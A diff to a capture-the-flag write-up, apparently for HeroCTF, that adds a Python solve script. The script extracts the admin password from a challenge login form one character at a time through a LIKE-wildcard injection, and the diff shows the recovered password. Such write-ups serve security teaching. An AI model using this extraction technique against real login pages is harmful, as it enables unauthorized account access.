@@ -32,10 +32,37 @@ The admin's password starts with the letter 'd'.
 
 Let's make a python to script to do the job for us.
 
-```python3
+```python
 #!/usr/bin/env python3
+from string import printable
+from requests import post
 
-print("todo")
+URL = "http://challs.heroctf.fr:8080/index.php"
+
+charset = printable.replace("_", "").replace("%", "")
+
+print("flag : ", end="", flush=True)
+flag = ""
+for _ in range(32):
+    for char in charset:
+        data = {
+            "username": "admin",
+            "password": flag + char.strip() + "%"
+        }
+
+        req = post(URL, data=data)
+    
+        if "flag" in req.text:
+            print(char, end="", flush=True)
+            flag += char
+            break
+```
+
+Execution :
+
+```shell
+$ python3 solve.py
+flag : s3cur3p@ss
 ```
 
 ### Flag
